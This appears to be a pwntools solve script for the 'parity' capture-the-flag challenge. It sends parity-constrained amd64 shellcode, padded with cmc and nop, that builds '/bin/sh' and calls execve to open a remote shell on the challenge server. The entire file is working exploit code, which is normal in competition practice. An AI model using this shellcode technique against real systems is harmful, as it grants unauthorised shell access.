from pwn import *

elf = ELF("./parity")

#p = elf.process()
p = remote("challs.actf.co", 31226)
context.arch = 'amd64'

raw_input("DEBUG")


shell = asm(
            f"""
            xor rsp, rsp
            cmc
            add rsp, {elf.bss(0x10401)}
            cmc
            sub rsp, 0x10001
            cmc

            xor rdx, rdx
            cmc

            mov al, 0x67
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc 
            
            mov al, 0x73
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x2f
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x6d
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x69
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x61
            inc ax
            cmc
            shl rax, 7
            shl rax, 1
            cmc

            mov al, 0x2f
            
            push rax
            pop rdi
            nop
           
            push rdi
            push rsp
            pop rbx

            push rdx
            cmc
            push rsp
            cmc
            pop rdx
            push rbx
            push rsp
            pop rcx

            xor rsi, rsi

            xor eax, eax
            cmc
            mov al, 0x0b
            nop
            int 0x80
            """
        )

payload = shell
p.send(payload)

p.interactive()
